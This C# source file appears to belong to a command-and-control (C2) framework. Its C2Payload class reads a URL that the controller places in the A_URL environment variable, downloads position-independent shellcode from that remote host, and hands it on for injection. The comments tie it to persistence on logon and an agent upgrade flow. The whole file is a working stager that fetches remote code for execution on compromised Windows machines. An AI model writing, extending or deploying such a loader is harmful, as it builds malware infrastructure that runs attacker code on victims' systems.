using System;
using System.Net;

namespace CSharpAgent
{
    // The agent is NOT stored in this assembly. The C2 writes the selected agent row's direct
    // download URL for this build's target arch (x86 / x64 / ARM64) to the A_URL process env
    // var BEFORE this DLL deserializes (the Upgrade window's 0x0C UpgradeNative lines, the
    // Persistence Manager's on-logon flow, or the legacy one-shot path); we fetch the raw
    // position-independent bytes at runtime and inject them. Standalone (no A_URL) Data is
    // empty and nothing is injected, keeping the repo self-contained and compilable without
    // the pipeline.
    internal static class C2Payload
    {
        internal static byte[] Data
        {
            get
            {
                string url = Environment.GetEnvironmentVariable("A_URL");
                if (string.IsNullOrEmpty(url)) return new byte[0];
                return Download(url);
            }
        }

        // TLS 1.2 first — modern hosts/CDNs (GitHub releases) refuse anything older, and the
        // int-cast form works on CLR 2.0 where SecurityProtocolType.Tls12 doesn't exist. Old
        // schannel stacks reject the value — swallowed, and the request proceeds with whatever
        // the OS allows. WebClient honors the system (WinInet) proxy and follows redirects.
        static byte[] Download(string url)
        {
            try
            {
                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            }
            catch { }

            WebClient client = new WebClient();
            return client.DownloadData(url);
        }
    }
}
